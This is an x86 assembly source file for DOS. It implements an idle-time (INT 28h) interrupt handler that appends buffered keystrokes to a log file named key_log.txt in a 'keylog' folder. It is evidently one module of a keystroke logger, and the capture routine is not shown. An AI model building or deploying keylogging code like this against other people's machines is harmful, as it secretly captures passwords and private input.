
locals @@

.186
.model tiny

.code

public Printer

public AsciiBuffer
public BufEnd

;==========================================================================
; 28th interrupt handler
; prints all symbols from the buffer when it's safe
;========================================================================== 

Printer		proc

		push 	ax bx cx dx ds

		xor 	cx, cx			; cx = 0

		mov 	cl, cs:BufEnd		
		cmp 	cl, cs:BufStart
		je 	@@exit			; if there's nothing to print
						; leave
		mov 	ax, 3d01h
		mov 	dx, offset FileSpec
		push 	cs
		pop  	ds
		int 	21h			; open file

		mov 	bx, ax			; save file handler to bx

		push 	cx
		mov 	ax, 4202h
		xor 	cx, cx
		xor 	dx, dx
		int 	21h
						; move cursor to the end
		pop 	cx

		push 	cx
		sub 	cl, cs:BufStart
		mov 	dx, offset AsciiBuffer
		xor 	ax, ax
		mov 	al, cs:BufStart
		add 	dx, ax
		mov 	ah, 40h		

		int 	21h			; write symbols from buffer
		pop 	cx

		mov 	cs:BufStart, cl		; BufStart = old BufEnd

		mov 	ah, 3eh
		int 	21h			; close file

@@exit:		pop 	ds dx cx bx ax				
	
		iret
		endp

; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

BufStart	db 1
BufEnd		db 2
AsciiBuffer	db 256 dup(0)

FileSpec	db "w:\keylog\log\key_log.txt", 0

;==========================================================================

end
